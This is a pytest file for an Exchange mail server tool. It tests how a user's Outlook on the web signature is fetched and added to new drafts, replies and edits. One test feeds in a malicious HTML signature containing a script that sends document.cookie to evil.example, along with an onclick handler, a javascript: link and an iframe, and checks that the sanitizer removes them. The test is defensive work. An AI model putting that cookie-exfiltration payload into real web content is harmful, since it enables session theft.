"""The person's Outlook on the web signature on a draft (core/signature.py), against recorded EWS answers.

GetUserConfiguration answers are shaped as Exchange documents them (MS-OXWSUSRCFG): a Dictionary of
DictionaryEntry, each a DictionaryKey and a DictionaryValue with a Type and a Value. Not yet compared with
a live Exchange: docs/live-findings.md lists it under what has not run live.
"""

from __future__ import annotations

import os
from html import escape

import pytest
from conftest import PUBLIC, base_env, error, ok
from test_mail import CREATED, MARK, TIPS, resolved

from exchange_mcp.config import ConfigError, Settings
from exchange_mcp.core import signature as sigs
from exchange_mcp.ews.common import DRAFT_PROPERTY_SET, SIGNATURE_PROPERTY_NAME
from exchange_mcp.ews.soap import NS_T

SIG_TEXT = "Alex Example\nHead of Testing"
SIG_HTML = "<div><b>Alex Example</b><br>Head of Testing</div>"
SIGNED = (
    f'<t:ExtendedProperty><t:ExtendedFieldURI PropertySetId="{DRAFT_PROPERTY_SET}" '
    f'PropertyName="{SIGNATURE_PROPERTY_NAME}" PropertyType="String"/><t:Value>1</t:Value></t:ExtendedProperty>'
)


def entry(key: str, value: str, kind: str = "String") -> str:
    return (
        "<t:DictionaryEntry><t:DictionaryKey><t:Type>String</t:Type>"
        f"<t:Value>{key}</t:Value></t:DictionaryKey><t:DictionaryValue><t:Type>{kind}</t:Type>"
        f"<t:Value>{escape(value)}</t:Value></t:DictionaryValue></t:DictionaryEntry>"
    )


def owa(*, html: str | None = SIG_HTML, text: str | None = SIG_TEXT, new: bool = True, reply: bool = True) -> bytes:
    """A recorded OWA.UserOptions answer; keys in the mixed case some builds write."""
    entries = [entry("timezone", "W. Europe Standard Time")]
    if html is not None:
        entries.append(entry("signaturehtml", html))
    if text is not None:
        entries.append(entry("SignatureText", text))
    entries.append(entry("autoaddsignature", "True" if new else "False", "Boolean"))
    entries.append(entry("AutoAddSignatureOnReply", "true" if reply else "false", "Boolean"))
    return ok(
        "GetUserConfiguration",
        '<m:UserConfiguration><t:UserConfigurationName Name="OWA.UserOptions"><t:DistinguishedFolderId Id="root"/>'
        f"</t:UserConfigurationName><t:Dictionary>{''.join(entries)}</t:Dictionary></m:UserConfiguration>",
    )


def saved(body_html: str, *, signed: bool = False, ours: bool = True) -> bytes:
    """A draft as GetItem returns it, with the body that was written."""
    return ok(
        "GetItem",
        '<m:Items><t:Message><t:ItemId Id="D1" ChangeKey="CK1"/><t:Subject>Hello</t:Subject>'
        f'<t:Body BodyType="HTML">{escape(body_html)}</t:Body><t:IsDraft>true</t:IsDraft>'
        f"{MARK if ours else ''}{SIGNED if signed else ''}"
        "<t:ToRecipients><t:Mailbox><t:Name>Pat</t:Name><t:EmailAddress>pat@corp.example</t:EmailAddress>"
        "</t:Mailbox></t:ToRecipients><t:IsRead>true</t:IsRead></t:Message></m:Items>",
    )


UPDATED = ok("UpdateItem", '<m:Items><t:Message><t:ItemId Id="D1" ChangeKey="CK2"/></t:Message></m:Items>')


def written_body(ews, op: str = "CreateItem") -> str:
    """The HTML body this server sent, unescaped from the request."""
    seen = ews.last(op)
    for tag in ("Body", "NewBodyContent"):
        found = seen.root.xpath(f"//t:{tag}", namespaces={"t": NS_T})
        if found:
            return found[0].text or ""
    raise AssertionError(f"no body in {op}")


def marker_values(ews, op: str) -> list[str]:
    seen = ews.last(op)
    return [
        p.xpath("string(*[local-name()='Value'])")
        for p in seen.root.xpath("//*[local-name()='ExtendedProperty']")
        if p.xpath("string(*[local-name()='ExtendedFieldURI']/@PropertyName)") == SIGNATURE_PROPERTY_NAME
    ]


def new_draft(ews, config: bytes | None, *, read_back: str = "<p>Hi there</p>") -> None:
    ews.on("ResolveNames", resolved("Pat", "pat@corp.example")).on("CreateItem", CREATED)
    ews.on("GetItem", saved(read_back)).on("GetMailTips", TIPS)
    if config is not None:
        ews.on("GetUserConfiguration", config)


def reply_draft(ews, config: bytes) -> None:
    reference = ok("GetItem", '<m:Items><t:Message><t:ItemId Id="M1" ChangeKey="R1"/></t:Message></m:Items>')
    ews.on("GetItem", reference, saved("<p>Thanks</p>"))
    ews.on("CreateItem", CREATED).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", config)


# ---------------------------------------------------------------- what is asked of Exchange


async def test_the_options_are_read_from_owa_user_options_on_the_root_folder(rt, ews, invoke):
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    req = ews.last("GetUserConfiguration")
    name = req.root.xpath("//*[local-name()='UserConfigurationName']")[0]
    assert name.get("Name") == "OWA.UserOptions"
    assert name.xpath("string(*[local-name()='DistinguishedFolderId']/@Id)") == "root"
    assert req.root.xpath("string(//*[local-name()='UserConfigurationProperties'])") == "Dictionary"
    # read before anything is written, once per call
    assert ews.ops().index("GetUserConfiguration") < ews.ops().index("CreateItem")
    assert ews.ops().count("GetUserConfiguration") == 1


# ---------------------------------------------------------------- new messages: autoaddsignature


async def test_a_new_text_draft_gets_the_text_signature_after_the_body(rt, ews, invoke):
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    body = written_body(ews)
    assert body.index("Hi there") < body.index("Alex Example") < body.index("Head of Testing")
    assert "<b>" not in body  # a text draft takes signaturetext, not the HTML
    assert marker_values(ews, "CreateItem") == ["1"]
    assert r.data["signature"] == sigs.ADDED


async def test_a_new_message_is_not_signed_when_owa_does_not_sign_new_messages(rt, ews, invoke):
    new_draft(ews, owa(new=False, reply=True))
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    assert "Alex Example" not in written_body(ews)
    assert marker_values(ews, "CreateItem") == []
    assert r.data["signature"] == sigs.OFF_NEW


async def test_an_html_draft_gets_the_html_signature(rt, ews, invoke):
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="<p>Hi <i>there</i></p>", html=True)
    assert not r.is_error, r.text
    body = written_body(ews)
    assert "<b>Alex Example</b>" in body and body.index("there") < body.index("Alex Example")


async def test_an_html_draft_without_an_html_signature_takes_the_text_one_escaped(rt, ews, invoke):
    new_draft(ews, owa(html=None, text="Alex <Example> & Co"))
    r = await invoke("save_draft", to=["pat@corp.example"], body="<p>Hi</p>", html=True)
    assert not r.is_error, r.text
    body = written_body(ews)
    assert "Alex &lt;Example&gt; &amp; Co" in body and "<Example>" not in body


async def test_a_text_draft_without_a_text_signature_takes_the_html_one_as_text(rt, ews, invoke):
    new_draft(ews, owa(text=None))
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    body = written_body(ews)
    assert "Alex Example" in body and "Head of Testing" in body and "<b>" not in body


# ---------------------------------------------------------------- replies and forwards: autoaddsignatureonreply


@pytest.mark.parametrize("mode", ["reply", "reply_all", "forward"])
async def test_a_reply_is_signed_after_the_new_text_and_above_the_quoted_original(rt, ews, invoke, mode):
    reply_draft(ews, owa(new=False, reply=True))
    ews.on("ResolveNames", resolved("Pat", "pat@corp.example"))
    to = ["pat@corp.example"] if mode == "forward" else None
    r = await invoke("save_draft", mode=mode, message="M1", body="Thanks", to=to)
    assert not r.is_error, r.text
    # NewBodyContent is what Exchange writes above the quoted original: the signature is inside it, last
    body = written_body(ews)
    assert body.index("Thanks") < body.index("Alex Example")
    assert r.data["signature"] == sigs.ADDED
    assert marker_values(ews, "UpdateItem") == ["1"]  # set together with the draft marker


async def test_a_reply_is_not_signed_when_owa_does_not_sign_replies(rt, ews, invoke):
    reply_draft(ews, owa(new=True, reply=False))
    r = await invoke("save_draft", mode="reply", message="M1", body="Thanks")
    assert not r.is_error, r.text
    assert "Alex Example" not in written_body(ews)
    assert marker_values(ews, "UpdateItem") == []
    assert r.data["signature"] == sigs.OFF_REPLY


# ---------------------------------------------------------------- no signature, never a failed draft


async def test_no_owa_options_saves_the_draft_without_a_signature(rt, ews, invoke):
    new_draft(ews, None)  # the fake's default: ErrorItemNotFound, a mailbox that never opened OWA
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    assert "CreateItem" in ews.ops() and r.data["signature"] == sigs.NO_OPTIONS


async def test_an_empty_signature_is_not_added(rt, ews, invoke):
    new_draft(ews, owa(html="", text=""))
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    assert r.data["signature"] == sigs.NO_OPTIONS and marker_values(ews, "CreateItem") == []


@pytest.mark.parametrize(
    "answer",
    [error("GetUserConfiguration", "ErrorAccessDenied"), error("GetUserConfiguration", "ErrorCorruptData"), 500],
)
async def test_an_exchange_error_reading_the_options_saves_the_draft_without_one(rt, ews, invoke, answer):
    new_draft(ews, answer)
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    assert "CreateItem" in ews.ops()
    assert "Alex Example" not in written_body(ews)
    assert r.data["signature"] == sigs.UNREADABLE


async def test_signature_false_leaves_it_out_without_asking_exchange(rt, ews, invoke):
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there", signature=False)
    assert not r.is_error, r.text
    assert "GetUserConfiguration" not in ews.ops()
    assert "Alex Example" not in written_body(ews)
    assert r.data["signature"] == sigs.NOT_WANTED


async def test_the_server_switch_off_leaves_it_out_without_asking_exchange(rt, ews, invoke, monkeypatch):
    import dataclasses

    monkeypatch.setattr(rt, "settings", dataclasses.replace(rt.settings, signature="off"))
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi there")
    assert not r.is_error, r.text
    assert "GetUserConfiguration" not in ews.ops()
    assert r.data["signature"] == sigs.OFF


def test_the_switch_is_a_closed_choice():
    assert Settings.from_env(base_env()).signature == "owa"
    assert Settings.from_env(base_env(SIGNATURE="off")).signature == "off"
    with pytest.raises(ConfigError, match="EXCHANGE_MCP_SIGNATURE must be one of owa, off"):
        Settings.from_env(base_env(SIGNATURE="always"))


# ---------------------------------------------------------------- the signature is untrusted content


async def test_a_malicious_signature_is_cleaned_like_a_body(rt, ews, invoke):
    evil = (
        '<div onclick="steal()">Alex Example<script>fetch("https://evil.example/"+document.cookie)</script>'
        '<a href="javascript:evil()">site</a><iframe src="https://evil.example/"></iframe></div>'
    )
    new_draft(ews, owa(html=evil))
    r = await invoke("save_draft", to=["pat@corp.example"], body="<p>Hi</p>", html=True)
    assert not r.is_error, r.text
    body = written_body(ews)
    assert "Alex Example" in body
    for bad in ("<script", "evil.example", "onclick", "javascript:", "<iframe"):
        assert bad not in body, bad
    assert r.data["signature"].startswith(sigs.ADDED + "; cleaned: removed")


async def test_a_signature_the_checks_refuse_is_left_out_and_the_draft_saved(rt, ews, invoke):
    new_draft(ews, owa(html='<img src="http://intranet.example/logo.png" alt="logo">Alex'))
    r = await invoke("save_draft", to=["pat@corp.example"], body="<p>Hi</p>", html=True)
    assert not r.is_error, r.text
    assert "logo" not in written_body(ews)
    assert r.data["signature"].startswith(sigs.REFUSED)
    assert marker_values(ews, "CreateItem") == []


# ---------------------------------------------------------------- edits never sign twice


async def test_an_edit_that_keeps_the_body_does_not_touch_the_signature(rt, ews, invoke):
    ews.on("GetItem", saved("<p>Hi</p>", signed=True)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", owa())
    r = await invoke("save_draft", id="D1", subject="New subject")
    assert not r.is_error, r.text
    assert "GetUserConfiguration" not in ews.ops()
    assert "item:Body" not in ews.last("UpdateItem").xml()
    assert r.data["signature"] == sigs.KEPT


async def test_an_edit_that_replaces_the_body_signs_it_once(rt, ews, invoke):
    ews.on("GetItem", saved("<p>Hi</p>", signed=True)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", owa(new=False, reply=False))  # flags were honoured at creation
    r = await invoke("save_draft", id="D1", body="Hello again")
    assert not r.is_error, r.text
    body = written_body(ews, "UpdateItem")
    assert body.count("Alex Example") == 1 and body.index("Hello again") < body.index("Alex Example")
    assert marker_values(ews, "UpdateItem") == ["1"]
    assert r.data["signature"] == sigs.ADDED_AGAIN


async def test_an_edit_whose_body_already_carries_the_signature_does_not_repeat_it(rt, ews, invoke):
    """A model that copies the preview back into body sends the signature with it."""
    ews.on("GetItem", saved("<p>Hi</p>", signed=True)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", owa())
    r = await invoke("save_draft", id="D1", body="Hello again\n\nAlex Example\nHead of Testing")
    assert not r.is_error, r.text
    assert written_body(ews, "UpdateItem").count("Alex Example") == 1
    assert r.data["signature"] == sigs.ALREADY


async def test_a_new_body_that_already_carries_the_signature_is_not_signed_twice(rt, ews, invoke):
    new_draft(ews, owa())
    r = await invoke("save_draft", to=["pat@corp.example"], body="Hi\n\nAlex Example\nHead of Testing")
    assert not r.is_error, r.text
    assert written_body(ews).count("Alex Example") == 1
    assert r.data["signature"] == sigs.ALREADY and marker_values(ews, "CreateItem") == ["1"]


async def test_an_unsigned_draft_stays_unsigned_when_edited(rt, ews, invoke):
    ews.on("GetItem", saved("<p>Hi</p>", signed=False)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", owa())
    r = await invoke("save_draft", id="D1", body="Hello again")
    assert not r.is_error, r.text
    assert "GetUserConfiguration" not in ews.ops()
    assert "Alex Example" not in written_body(ews, "UpdateItem")
    assert r.data["signature"] == sigs.UNSIGNED


async def test_an_edit_with_signature_false_clears_the_marker(rt, ews, invoke):
    ews.on("GetItem", saved("<p>Hi</p>", signed=True)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    r = await invoke("save_draft", id="D1", body="Hello again", signature=False)
    assert not r.is_error, r.text
    assert "Alex Example" not in written_body(ews, "UpdateItem")
    assert marker_values(ews, "UpdateItem") == ["0"]  # a later edit must not bring it back


async def test_the_marker_is_read_back_from_the_draft(rt, ews, cred):
    from exchange_mcp.ews import mail as em

    ews.on("GetItem", saved("<p>x</p>", signed=True))
    assert (await em.get_message(rt_ews(rt, cred), "D1")).signed is True
    shape = ews.last("GetItem").xml()
    assert f'PropertyName="{SIGNATURE_PROPERTY_NAME}"' in shape
    ews.on("GetItem", saved("<p>x</p>", signed=False))
    assert (await em.get_message(rt_ews(rt, cred), "D1")).signed is False


def rt_ews(rt, cred):
    from conftest import EWS_URL

    from exchange_mcp.ews.client import Ews

    return Ews(rt.http, EWS_URL, cred.auth())


# ---------------------------------------------------------------- an uploaded letter replaces the body too


async def test_an_uploaded_letter_on_a_signed_draft_is_signed_once(ews, cred):
    from test_links import app_for

    from exchange_mcp.auth.credential import person_key
    from exchange_mcp.core import context
    from exchange_mcp.keys.seal import LocalSealer

    client = app_for(ews, LocalSealer([("k1", os.urandom(32))]))
    ews.on("GetItem", saved("<p>Hi</p>", signed=True)).on("UpdateItem", UPDATED)
    ews.on("GetUserConfiguration", owa())
    link = await context.runtime().links.upload(cred, person_key(cred.login), "D1", "body")
    r = await client.put(link["url"].replace(PUBLIC, ""), content=b"<h1>Quarterly letter</h1><p>Text</p>")
    assert r.status_code == 200, r.text
    body = written_body(ews, "UpdateItem")
    assert body.count("Alex Example") == 1 and body.index("Quarterly") < body.index("Alex Example")
    assert r.json()["signature"] == sigs.ADDED_AGAIN


# ---------------------------------------------------------------- a signature with an embedded logo

PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
LOGO = f'<div>Alex Example</div><img src="data:image/png;base64,{PNG}" alt="logo">'


def logo_name() -> str:
    import base64
    import hashlib

    return f"img-{hashlib.sha256(base64.b64decode(PNG)).hexdigest()[:16]}.png"


def signed_with_logo(attached: bool) -> bytes:
    atts = (
        f'<t:Attachments><t:FileAttachment><t:AttachmentId Id="A1"/><t:Name>{logo_name()}</t:Name>'
        "<t:IsInline>true</t:IsInline></t:FileAttachment></t:Attachments>"
        if attached
        else ""
    )
    return ok(
        "GetItem",
        '<m:Items><t:Message><t:ItemId Id="D1" ChangeKey="CK1"/><t:Subject>Hello</t:Subject>'
        f'<t:Body BodyType="HTML">&lt;p&gt;Hi&lt;/p&gt;</t:Body><t:IsDraft>true</t:IsDraft>{atts}{MARK}{SIGNED}'
        "<t:IsRead>true</t:IsRead></t:Message></m:Items>",
    )


async def test_a_signature_logo_is_attached_inline_once_on_creation(rt, ews, invoke):
    new_draft(ews, owa(html=LOGO))
    ews.on("CreateAttachment", ok("CreateAttachment"))
    r = await invoke("save_draft", to=["pat@corp.example"], body="<p>Hi</p>", html=True)
    assert not r.is_error, r.text
    assert ews.ops().count("CreateAttachment") == 1
    att = ews.last("CreateAttachment").xml()
    assert logo_name() in att and "IsInline>true" in att
    assert "cid:" + logo_name().removesuffix(".png") in written_body(ews)


async def test_an_edit_that_puts_the_signature_back_does_not_attach_its_logo_again(rt, ews, invoke):
    """The edit replaces the body but keeps the attachments: the logo is already there."""
    ews.on("GetItem", signed_with_logo(attached=True)).on("UpdateItem", UPDATED).on("GetMailTips", TIPS)
    ews.on("GetUserConfiguration", owa(html=LOGO)).on("CreateAttachment", ok("CreateAttachment"))
    for text in ("Hello again", "Hello a third time"):
        r = await invoke("save_draft", id="D1", body=f"<p>{text}</p>", html=True)
        assert not r.is_error, r.text
        assert written_body(ews, "UpdateItem").count("Alex Example") == 1
    assert "CreateAttachment" not in ews.ops()


def test_an_image_only_signature_is_recognised_in_a_body_that_carries_it():
    sig = '<img src="cid:img-0123456789abcdef">'
    assert sigs.carries('<p>Hi</p><div><img src="cid:img-0123456789abcdef"></div>', sig)
    assert not sigs.carries("<p>Hi</p>", sig)
    assert not sigs.carries("<p>Hi</p>", "<div> </div>")  # nothing to recognise: not carried


def test_a_short_signature_is_not_found_inside_another_word():
    assert not sigs.carries("<p>We are planning the release.</p>", "<div>Ann</div>")
    assert sigs.carries("<p>Thanks,<br>Ann</p>", "<div>Ann</div>")
